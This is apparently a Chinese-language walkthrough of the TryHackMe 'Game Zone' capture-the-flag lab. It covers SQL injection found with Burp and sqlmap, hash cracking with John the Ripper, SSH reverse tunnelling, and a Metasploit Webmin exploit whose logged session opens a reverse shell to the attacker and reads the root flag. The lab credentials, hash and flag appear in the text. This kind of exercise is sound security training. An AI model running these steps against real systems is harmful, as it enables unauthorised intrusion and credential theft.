# TryHackMe -- Offensive Pentesting -- Game Zone


Offensive Pentesting -- Game Zone walkthrough.

<!--more-->

# THM -- Offensive Pentesting -- Game Zone

## Deploy the vulnerable machine

### What is the name of the large cartoon avatar holding a sniper on the forum?

直接使用图片搜索：agent 47

## Obtain access via SQLi

### When you've logged in, what page do you get redirected to?

使用登录功能，先抓包看下通信数据：

![image-20240319154426077](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191544451.png)

理论上，没有防护的情况下，可以尝试一下爆破username和password参数。这里我们还要测试一下，看看有没有过滤特殊字符串，响应一样，判断不出来。那就尝试sql注入：

![image-20240319154931261](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191549294.png)

![image-20240319154943866](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191549889.png)

username处存在字符型注入，后续我们可以考虑使用这个sql注入来获取权限。





所以答案就是`portal.php`。

## Using SQLMap

上面发现了一个sql注入漏洞，那么现在就可以使用这个漏洞来往下进行了，这里使用的工具是sqlmap。

### In the users table, what is the hashed password?

burp抓包请求，拿到请求内容：

![image-20240319160716561](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191607592.png)

![image-20240319160807420](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191608452.png)

然后上sqlmap：

![image-20240319162320980](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191623006.png)

![image-20240319162520205](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191625230.png)

数据库是mysql，参数`searchitem`存在sql注入漏洞。接下来直接dump数据库的表：

![image-20240319162617990](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191626026.png)

![image-20240319162851290](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191628325.png)

答案是users表中的pwd的hash。

### What was the username associated with the hashed password?

agent47

### What was the other table name?

post

## Cracking a password with JohnTheRipper

在上面拿到了密码，下面可以尝试进行解密密码。

### What is the de-hashed password?

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ cat hash.txt
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:00 DONE (2024-03-19 04:32) 5.882g/s 17347Kp/s 17347Kc/s 17347KC/s vimivi..vainlove
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

### What is the user flag?

直接用户名密码ssh登录.

## Exposing services with reverse SSH tunnels

使用ssh建立反向代理隧道：

### How many TCP sockets are running?

```shell
agent47@gamezone:~$ netstat -antpul|grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

总计5个。

### What is the name of the exposed CMS?

上面的端口里，有个10000端口访问不到，怀疑是做了防火墙限制，也就是不出网。如果是这样，我们就需要使用代理把10000端口的服务反向代理出来，这里可以直接使用ssh：

![image-20240319165506045](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191655100.png)

然后在kali上直接访问kali的10000端口：

![image-20240319165543695](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191655751.png)

是一个Webmin的cms，直接用`agent47/videogamer124`登录访问，可以看到详细信息。

## Privilege Escalation with Metasploit

想办法利用Webmin进行提权即可。

首先searchsploit搜索一下：

![image-20240319171155936](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191712753.png)

直接使用msf即可:

![image-20240319171407203](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191714269.png)

![image-20240319171558152](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403191715219.png)

打完直接就是root权限了，这个没有涉及到提权：

```shell
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit

[*] Started reverse TCP double handler on 10.2.124.22:4444
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo E6mj7UoFjqWBNVOO;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.2.124.22:4444 -> 10.10.55.169:45412) at 2024-03-19 05:24:33 -0400


Shell Banner:
E6mj7UoFjqWBNVOO
-----

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/usr/share/webmin/file/
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
```

## 总结

这个练习感觉思维比方法更重要，攻击路径是拿到第一个站点-> 漏洞利用拿到用户名和密码 -> 端口发现第二个站点 -> 反带不出网机器 -> 漏洞利用第二个站点拿管理员权限。

知识点：

- 反向代理（后续会出一个详细的关于代理的文章）
- sql注入
